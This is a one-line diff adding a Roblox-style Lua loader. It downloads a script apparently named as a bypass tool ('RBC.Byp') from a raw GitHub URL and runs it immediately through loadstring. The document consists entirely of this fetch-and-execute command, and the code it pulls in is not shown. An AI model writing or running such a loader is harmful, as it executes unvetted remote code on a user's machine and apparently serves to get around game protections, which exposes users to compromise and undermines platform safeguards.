@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RealRBC/RBC.Byp/main/RBC.Byp%20V.1.3"))()
